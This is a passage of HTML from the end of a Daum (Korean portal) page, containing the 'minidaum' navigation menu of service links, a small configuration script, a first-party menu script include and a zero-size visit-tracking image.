target="_top">루리웹</a></li></ul> <strong class="minidaum_idx minidaum_idx2">더보기 2열</strong><ul class="minidaum_list_group minidaum_list_group2"><li><a href="http://mileage.daum.net/?nil_profile=mini&amp;nil_src=mileag" target="_top">마일리지</a></li><li><a href="http://webtoon.daum.net/?nil_profile=mini&amp;nil_src=cartoon" target="_top">만화속세상</a></li><li><a href="http://mail.daum.net/hanmail/mobile/MsgComposeExpress.daum?nil_profile=mini&amp;nil_src=sms" target="_top">문자</a></li><li><a href="http://miznet.daum.net/?nil_profile=mini&amp;nil_src=miznet" target="_top">미즈넷</a></li><li><a href="http://realestate.daum.net/?nil_profile=mini&amp;nil_src=realestate" target="_top">부동산</a></li><li><a href="http://blog.daum.net/?nil_profile=mini&amp;nil_src=blog" target="_top">블로그</a></li></ul> <strong class="minidaum_idx minidaum_idx3">더보기 3열</strong><ul class="minidaum_list_group minidaum_list_group3"><li><a href="http://sports.media.daum.net/?nil_profile=mini&amp;nil_src=sports" target="_top">스포츠</a></li><li><a href="http://agora.media.daum.net/?nil_profile=mini&amp;nil_src=agora" target="_top">아고라</a></li><li><a href="http://alldic.daum.net/?nil_profile=mini&amp;nil_src=dictionary" target="_top">어학사전</a></li><li><a href="http://media.daum.net/entertain/?nil_profile=mini&amp;nil_src=entertain" target="_top">연예</a></li><li><a href="http://movie.daum.net/?nil_profile=mini&amp;nil_src=movie" target="_top">영화</a></li></ul> <strong class="minidaum_idx minidaum_idx4">더보기 4열</strong><ul class="minidaum_list_group minidaum_list_group4"><li><a href="http://auto.daum.net/?nil_profile=mini&amp;nil_src=auto" target="_top">자동차</a></li><li><a href="http://local.daum.net/map/?nil_profile=mini&amp;nil_src=map" target="_top">지도</a></li><li><a href="http://ebs.daum.net/?nil_profile=mini&amp;nil_src=ebs" target="_top">EBS지식</a></li><li><a href="http://book.daum.net/?nil_profile=mini&amp;nil_src=book" target="_top">책</a></li><li><a href="http://k.daum.net/qna/item/fstudy/?nil_profile=mini&amp;nil_src=study" target="_top">체험학습</a></li></ul> <strong class="minidaum_idx minidaum_idx5">더보기 5열</strong><ul class="minidaum_list_group minidaum_list_group5"><li><a href="http://cafe.daum.net/?nil_profile=mini&amp;nil_src=cafe" target="_top">카페</a></li><li><a href="http://cloud.daum.net/?nil_profile=mini&amp;nil_src=cloud" target="_top">클라우드</a></li><li><a href="http://tvpot.daum.net/Top.do?nil_profile=mini&amp;nil_src=tvpot" target="_top">tv팟</a></li><li><a href="http://www.tistory.com/?nil_profile=mini&amp;nil_src=tistory" target="_top">티스토리</a></li><li><a href="http://tip.daum.net/?nil_profile=mini&amp;nil_src=knowledge" target="_top">팁</a></li><li><a href="http://hope.daum.net/?nil_profile=mini&amp;nil_src=hope" target="_top">희망해</a></li><li class="last minidaum_all"><a href="http://www.daum.net/doc/sitemap/?nil_profile=mini&amp;nil_src=all" target="_top">전체보기</a></li></ul></div></div></div>
<script type="text/javascript">
var minidaum_options = {
    bgType: "dark",
    enableLogoutRetun: false,
    returnUrl: '',
    disableHotissue: true,
    disableLogo: true,
    disableTracker: true,
    enableShield: false,
    enableTopLink: true
}
</script>
<script src="http://go.daum.net/jsa_minidaum_pc.daum" charset="utf-8" type="text/javascript"></script>
<img src="http://redirect.daum.net/redirect/free_click.daum?sid=mail_visit_login" class="screen_out" width="0" height="0">


</body></html>